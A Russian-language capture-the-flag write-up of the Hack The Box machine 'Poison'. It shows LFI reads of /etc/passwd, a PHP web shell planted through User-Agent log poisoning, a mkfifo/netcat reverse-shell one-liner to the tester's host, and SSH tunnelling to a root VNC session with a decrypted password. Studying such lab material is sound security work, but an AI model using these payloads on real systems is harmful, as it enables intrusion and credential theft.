---
layout: post
title: "HTB{ Poison }"
date: 2018-09-16 20:00:00 +0300
author: snovvcrash
tags: [ctf, write-up, box, hackthebox, Poison, freebsd, apache, apache-tomcat, php, log-poisoning, web-shell, reverse-shell, lfi, phpinfo, vnc, ssh-tunneling]
comments: true
published: true
---

**Poison** — одна из самых простых машин с Hack The Box на мой взгляд (если идти самым простым путем, хех), и, по совместительству, моя первая машина с этой платформы. *FreeBSD* внутри, эта виртуалка предоставляет целых 3 способа прохождения первого этапа: можно забрать авторизационные данные пользователя прямо с веба, если хорошо поискать (самый простой вариант); отравить логи веб-сервера и получить reverse-shell; или же получить RCE с помощью связки *LFI + PHPInfo()* (самый трудный способ, возможно, не задуманный создателем машины). Далее для повышения привилегий придется пробросить *VNC*-соединение через *SSH*-туннель.

<!--cut-->

**3.9/10**
{: style="color: orange; text-align: right;"}

[![banner.png]({{ "/img/htb/boxes/poison/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/132 "Hack The Box :: Poison")
{: .center-image}

![info.png]({{ "/img/htb/boxes/poison/info.png" | relative_url }})
{: .center-image}

* TOC
{:toc}

# Разведка
## Nmap
По традиции запустим Nmap в 2 этапа. Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.84
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sat Sep 15 14:45:00 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up, received user-set (0.073s latency).
Scanned at 2018-09-15 14:45:00 EDT for 0s
Not shown: 798 filtered ports, 200 closed ports
Reason: 798 no-responses and 200 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Sep 15 14:45:00 2018 -- 1 IP address (1 host up) scanned in 0.58 seconds
```

Version ([красивый отчет]({{ "/nmap/htb/poison/version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,80 10.10.10.84
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sat Sep 15 14:41:28 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl -p22,80 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2018-09-15 14:41:29 EDT for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 15 14:41:38 2018 -- 1 IP address (1 host up) scanned in 9.50 seconds
```

SSH на 22-м, и web-сервис на 80-м портах. Начнем с веба.

# Web — Порт 80
## Браузер
Перейдя по `http://10.10.10.84`, видим:

[![port80-browser-1.png]({{ "/img/htb/boxes/poison/port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/poison/port80-browser-1.png" | relative_url }})
{: .center-image}

Страничка с тестом php-скриптов. Не долго думая, откроем `listfiles.php`:

```html
<!-- view-source:http://10.10.10.84/browse.php?file=listfiles.php -->

Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

7 элементов массива, не считая текущей и предыдущей директорий (`.`, `..`). На главной страничке было указано 4 файла, теперь видно, что помимо них имеется: `browse.php` — скрипт, который и отвечает за показ содержимого других файлов и выполнение php-скриптов (сердце LFI-уязвимости, можно воспользоваться `/browse.php?file=php://filter/convert.base64-decode/resource=<SCRIPT.PHP>`, чтобы посмотреть на исходник скрипта, а не выполнить его), `index.php` — собственно сама главная страница, и таинственный `pwdbackup.txt`.

К `phpinfo.php` еще вернемся, `ini.php` не представляtтся ценным, а в `info.php` — информация о системе (просто вывод `uname -a`, I guess):

```html
<!-- view-source:http://10.10.10.84/browse.php?file=info.php -->

FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```

## Захват пользователя. Способ 1, читерский (Web)

Ну и сразу откроем `pwdbackup.txt`, интересно же :joy:

```html
<!-- view-source:http://10.10.10.84/pwdbackup.txt -->

This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

13-кратно за'*base64*'ный пароль, что может быть надежнее. Смотрим, что внутри:

```
root@kali:~# wget http://10.10.10.84/pwdbackup.txt

root@kali:~# tail -n +3 pwdbackup.txt |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d
Charix!2#4%6&8(0
```

Заберем имя из `/etc/passwd` (LFI же!):
```
<!-- view-source:http://10.10.10.84/browse.php?file=/etc/passwd -->

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

И, собственно, на этом все. Имеем логин и пароль — `charix:Charix!2#4%6&8(0` — для входа в систему.

На этом заканчивается простой способ.

## Захват пользователя. Способ 2, канонический (Log Poisoning)

Представим более дальновидного админа, который не стал бы оставлять пароль от учетки пользователя в директории веб-сервера (понимаю, он целых 13 раз защищен, но все же). В этом случае будем пользоваться такой замечательной тактикой, как отравление логов (aka *Log Poisoning*), нужно же оправдать название машины :wink:

### Proof-of-Concept
Для начала проверим, что такая атака осуществима. Логи ваших Апачей во FreeBSD лежат в `/var/log/httpd-*.log` файлах, а именно это:
  1. `/var/log/httpd-access.log` — лог обращений к ресурсу;
  2. `/var/log/httpd-error.log` — лог ошибок.

В существовании таких файлов можно убедиться с помощью все того же LFI.

Воспользуемся `curl`, чтобы проверить выполнимость php-инъекции в User-Agent:
```text
root@kali:~# curl -A "<?php echo('3V1L H4CK3R HERE'); ?>" -X GET "http://10.10.10.84/non-existent-page"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /non-existent-page was not found on this server.</p>
</body></html>
```

И заглянем в `/var/log/httpd-access.log`. Он большой, только последняя запись:

```
<!-- view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log -->

<html><head></head><body>
...
10.10.14.14 - - [15/Sep/2018:22:29:59 +0200] "GET /non-existent-page HTTP/1.1" 404 215 "-" "3V1L H4CK3R HERE"
</body></html>
```

Видно, что сообщение не заключено в php-теги, нет команды echo, откуда очевидно следует, что инжектированный код успешно выполнился.

### Web-Shell → RCE

Мастерим веб-шелл:
```text
root@kali:~# curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://10.10.10.84/non-existent-page"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /non-existent-page was not found on this server.</p>
</body></html>
```

И можем творить, что угодно на сервере, например дадим `ls`:

[![port80-browser-2.png]({{ "/img/htb/boxes/poison/port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/poison/port80-browser-2.png" | relative_url }})
{: .center-image}

### RCE → Reverse-Shell

А здесь и до реверс-шелла недалеко. Перейдем по адресу `http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.14 31337 >/tmp/f` и получим желанный коннект на netcat:
```text
nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.84.
Ncat: Connection from 10.10.10.84:62021.

whoami
www

id
uid=80(www) gid=80(www) groups=80(www)

uname -a
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64

ls -la
total 72
drwxr-xr-x  2 root  wheel   512 Mar 19 16:27 .
drwxr-xr-x  6 root  wheel   512 Jan 24  2018 ..
-rw-r--r--  1 root  wheel    33 Jan 24  2018 browse.php
-rw-r--r--  1 root  wheel   289 Jan 24  2018 index.php
-rw-r--r--  1 root  wheel    27 Jan 24  2018 info.php
-rw-r--r--  1 root  wheel    33 Jan 24  2018 ini.php
-rw-r--r--  1 root  wheel    90 Jan 24  2018 listfiles.php
-rw-r--r--  1 root  wheel    20 Jan 24  2018 phpinfo.php
-rw-r--r--  1 root  wheel  1267 Mar 19 16:27 pwdbackup.txt
```

```text
cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

Добрались до кредов способом номер 2.

## Захват пользователя. Способ 3, изобретательный (LFI + PHPInfo())
Не буду в рамках этого райтапа проходить 3-й способ (слишком много скриншотов потребуется делать :weary:) просто оставлю ссылку на исчерпывающий [документ](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf "- LFI With PHPInfo Assistance.pdf").

Идея вкратце: PHPInfo() позволяет загружать произвольные значения в раздел PHP Variables, которые сохраняются во временный файл:

[![lfi-phpinfo.png]({{ "/img/htb/boxes/poison/lfi-phpinfo.png" | relative_url }})]({{ "/img/htb/boxes/poison/lfi-phpinfo.png" | relative_url }})
{: .center-image}

Но этот файл удаляется сервером сразу же после окончания загрузки странички с PHPInfo(). Этот [скрипт](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/phpinfolfi.py "PayloadsAllTheThings/phpinfolfi.py at master · swisskyrepo/PayloadsAllTheThings"), описанный в публикации выше, провоцирует состояние гонки для того, чтобы успеть загрузить вредоносную нагрузку во временный файл (реверс-шелл, например) и выполнить его прежде, чем сервер удалит этот файл.

Скомканно, но, думаю, идея ясна.

# SSH — Порт 22 (внутри машины)
Time to SSH a bit:
```text
root@kali:~# sshpass -p 'Charix!2#4%6&8(0' ssh -oStrictHostKeyChecking=no charix@10.10.10.84
Last login: Sun Sep 16 15:24:58 2018 from 10.10.14.69
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
If you `set watch = (0 any any)' in tcsh, you will be notified when
someone logs in or out of your system.

charix@Poison:~ % whoami
charix

charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)

charix@Poison:~ % ls -la
total 52
drwxr-x---  3 charix  charix   512 Sep 16 15:27 .
drwxr-xr-x  3 root    wheel    512 Mar 19 16:08 ..
-rw-r-----  1 charix  charix  1041 Mar 19 17:16 .cshrc
-rw-rw----  1 charix  charix     0 Sep 16 15:16 .history
-rw-r-----  1 charix  charix   254 Mar 19 16:08 .login
-rw-r-----  1 charix  charix   163 Mar 19 16:08 .login_conf
-rw-r-----  1 charix  charix   379 Mar 19 16:08 .mail_aliases
-rw-r-----  1 charix  charix   336 Mar 19 16:08 .mailrc
-rw-r-----  1 charix  charix   802 Mar 19 16:08 .profile
-rw-r-----  1 charix  charix   281 Mar 19 16:08 .rhosts
-rw-r-----  1 charix  charix   849 Mar 19 16:08 .shrc
drwx------  2 charix  charix   512 Sep 16 11:57 .ssh
-rw-r-----  1 root    charix   166 Mar 19 16:35 secret.zip
-rw-r-----  1 root    charix    33 Mar 19 16:11 user.txt
```

## user.txt
Заберем флаг пользователя:
```text
charix@Poison:~ % cat /home/charix/user.txt
eaacdfb2????????????????????????
```

И уделим внимание файлу с интригующим названием `secret.zip`. Заберем на свою машину для изучения:
```text
root@kali:~# sshpass -p 'Charix!2#4%6&8(0' scp -oStrictHostKeyChecking=no charix@10.10.10.84:secret.zip .

root@kali:~# unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: Charix!2#4%6&8(0
 extracting: secret
```

```text
root@kali:~# cat secret
[|Ֆz!

root@kali:~# xxd secret
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

Скачали, распаковали (обратим внимание на плохую политику паролей: пароль от пользовательской учетки подошел и для архива), просмотрели содержимое. Просто набор байт, пока кроме предположения, что это ключ к какому-то сервису, ничего в голову не приходит.

## PrivEsc: charix → root

Вернемся на Poison и осмотримся. Среди множества мусора, полученного в результате вывода `ps aux`, видим одну необычную строчку:
```text
charix@Poison:~ % ps auxww
USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
...
root    545   0.0  0.9  23620  9032 v0- I    15:13    0:00.09 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport
...
```

Это же VNC-сервак! Посмотрим сеть для того, чтобы удостовериться:
```text
charix@Poison:~ % netstat -anp tcp | grep -i listen
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

Два крайних прослушиваемых сокета подтверждают вышесказанное.

### VNC (теория)
Что такое [VNC](https://ru.wikipedia.org/wiki/Virtual_Network_Computing "Virtual Network Computing — Википедия")? Далее краткая сводка из Вики.

> **Virtual Network Computing (VNC)** — это система удаленного доступа к рабочему столу компьютера, использующая протокол RFB (**R**emote **F**rame**B**uffer). VNC состоит из двух частей: клиента и сервера. Сервер — программа, предоставляющая доступ к экрану компьютера, на котором она запущена. Клиент (или viewer) — программа, получающая изображение экрана с сервера и взаимодействующая с ним по протоколу RFB.

> По умолчанию RFB использует диапазон TCP-портов с 5900 до 5906. Каждый порт представляет собой соответствующий экран X-сервера (порты с 5900 по 5906 ассоциированы с экранами с :0 по :6). Java-клиенты, доступные во многих реализациях, использующих встроенный веб-сервер для этой цели, например, в RealVNC, связаны с экранами таким же образом, но на диапазоне портов с 5800 до 5806.

> Изначально VNC не использует шифрование трафика, однако в процедуре аутентификации пароль не передается в открытом виде, а используется алгоритм «вызов-ответ» с DES-шифрованием (эффективная длина ключа составляет 56 бит). Во многих реализациях существует ограничение в 8 символов на длину пароля и если его длина превосходит 8 символов, то пароль урезается, а лишние символы игнорируются.

> При необходимости надежного шифрования всей VNC-сессии, она может быть установлена через SSL, SSH или VPN-туннель, а также поверх IPsec.

Отсюда 5801 и 5901 порты, и держу пари, что ~~захваченный~~ позаимствованный `secret` это обфусцированная парольная фраза (⩽ 8 символов) для аутентификации VNC-соединения

[Тут](https://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html "Using VNC with SSH") можно посмотреть на рарную кембриджскую статью (99-го года аж!) про VNC через SSH.

### SSH-Tunneling
Пробросим порт до своей машины, используя [магию](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences "SANS Penetration Testing - Using the SSH 'Konami Code' (SSH Control Sequences) - SANS Institute") ssh-escape-последовательностей, чтобы не реинициализировать подключение:
```text
charix@Poison:~ %
charix@Poison:~ % ~C
ssh> -L 5901:127.0.0.1:5901
Forwarding port.

charix@Poison:~ %
```

И подключимся к удаленному рабочему столу (в качестве параметров используем полученный ранее секрет и первый экран X-сервера):
```
root@kali:~# vncviewer -passwd secret 127.0.0.1:1
```

### root.txt
Забираем флаг:

[![port5901-vnc-1.png]({{ "/img/htb/boxes/poison/port5901-vnc-1.png" | relative_url }})]({{ "/img/htb/boxes/poison/port5901-vnc-1.png" | relative_url }})
{: .center-image}

Poison пройден :triumph:

![owned-user.png]({{ "/img/htb/boxes/poison/owned-user.png" | relative_url }})
{: .center-image}

![owned-root.png]({{ "/img/htb/boxes/poison/owned-root.png" | relative_url }})
{: .center-image}

![trophy.png]({{ "/img/htb/boxes/poison/trophy.png" | relative_url }})
{: .center-image}

# Эпилог
## Раскрытие секрета VNC
Посмотрим, что скрывалось в файле `secret`. Зачем? Потому что можем:
```text
root@kali:~# git clone https://github.com/jeroennijhof/vncpwd && cd vncpwd

root@kali:~# make
gcc -Wall -g -o vncpwd vncpwd.c d3des.c

root@kali:~# ./vncpwd ../secret
Password: VNCP@$$!
```

`VNCP@$$!` — как раз 8 символов:exclamation:

## /root/.vnc/passwd
А в этой директории лежит, файл с паролем, о чудо, идентичный распакованному `/home/charix/secret.zip`.

[![port5901-vnc-2.png]({{ "/img/htb/boxes/poison/port5901-vnc-2.png" | relative_url }})]({{ "/img/htb/boxes/poison/port5901-vnc-2.png" | relative_url }})
{: .center-image}
